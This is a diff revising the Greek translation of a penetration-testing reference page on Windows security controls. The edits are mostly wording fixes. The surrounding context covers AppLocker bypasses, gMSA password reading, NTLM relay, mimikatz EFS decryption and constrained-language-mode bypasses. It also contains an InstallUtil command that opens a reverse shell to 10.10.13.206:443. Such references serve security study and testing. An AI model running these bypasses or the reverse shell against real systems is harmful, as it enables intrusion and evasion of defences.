@@ -11,7 +11,7 @@
 
 ### Check
 
-Έλεγχος ποια αρχεία/επέκταση είναι στη μαύρη λίστα/λευκή λίστα:
+Έλεγχος ποια αρχεία/επέκταση είναι στη μαύρη/λευκή λίστα:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -33,7 +33,7 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κωδικοί μπορεί να είναι επίσης χρήσιμοι για να παρακαμφθεί το AppLocker.
+- Συνήθως **έμπιστοι** [**"LOLBAS's"**](https://lolbas-project.github.io/) δυαδικοί κώδικες μπορούν επίσης να είναι χρήσιμοι για να παρακαμφθεί το AppLocker.
 - **Κακώς γραμμένοι κανόνες θα μπορούσαν επίσης να παρακαμφθούν**
 - Για παράδειγμα, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, μπορείτε να δημιουργήσετε έναν **φάκελο με όνομα `allowed`** οπουδήποτε και θα επιτραπεί.
 - Οι οργανισμοί συχνά επικεντρώνονται στο **να μπλοκάρουν το `%System32%\WindowsPowerShell\v1.0\powershell.exe` εκτελέσιμο**, αλλά ξεχνούν τις **άλλες** [**τοποθεσίες εκτελέσιμων PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) όπως το `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ή το `PowerShell_ISE.exe`.
@@ -134,7 +134,9 @@ This way requires the **victim user** to be **running** a **process** inside the
 
 #### Knowing the users password
 
-{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
+{{#ref}}
+https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
+{{#endref}}
 
 ## Group Managed Service Accounts (gMSA)
 
@@ -156,7 +158,7 @@ You can read this password with [**GMSAPasswordReader**](https://github.com/rvaz
 ```
 [**Βρείτε περισσότερες πληροφορίες σε αυτήν την ανάρτηση**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
-Επίσης, ελέγξτε αυτήν [τη σελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
+Επίσης, ελέγξτε αυτήν την [ιστοσελίδα](https://cube0x0.github.io/Relaying-for-gMSA/) σχετικά με το πώς να εκτελέσετε μια **επίθεση NTLM relay** για να **διαβάσετε** τον **κωδικό πρόσβασης** του **gMSA**.
 
 ## LAPS
 
@@ -191,7 +193,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες, ελέγξτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+Μπορείτε να χρησιμοποιήσετε [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ή [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) για να **εκτελέσετε κώδικα Powershell** σε οποιαδήποτε διαδικασία και να παρακάμψετε τη περιορισμένη λειτουργία. Για περισσότερες πληροφορίες δείτε: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## Πολιτική Εκτέλεσης PS
 
@@ -229,14 +231,14 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 - %windir%\Windows\System32\kerberos.dll
 - **NTLMv1** και **NTLMv2**: Λόγοι συμβατότητας
 - %windir%\Windows\System32\msv1_0.dll
-- **Digest**: Web servers και LDAP, κωδικός πρόσβασης με τη μορφή MD5 hash
+- **Digest**: Web servers και LDAP, κωδικός πρόσβασης σε μορφή MD5 hash
 - %windir%\Windows\System32\Wdigest.dll
 - **Schannel**: SSL και TLS
 - %windir%\Windows\System32\Schannel.dll
 - **Negotiate**: Χρησιμοποιείται για να διαπραγματευτεί το πρωτόκολλο που θα χρησιμοποιηθεί (Kerberos ή NTLM, με το Kerberos να είναι το προεπιλεγμένο)
 - %windir%\Windows\System32\lsasrv.dll
 
-#### The negotiation could offer several methods or only one.
+#### Η διαπραγμάτευση μπορεί να προσφέρει πολλές μεθόδους ή μόνο μία.
 
 ## UAC - User Account Control
 
@@ -245,6 +247,5 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 {{#ref}}
 windows-security-controls/uac-user-account-control.md
 {{#endref}}
-
 
 {{#include ../banners/hacktricks-training.md}}
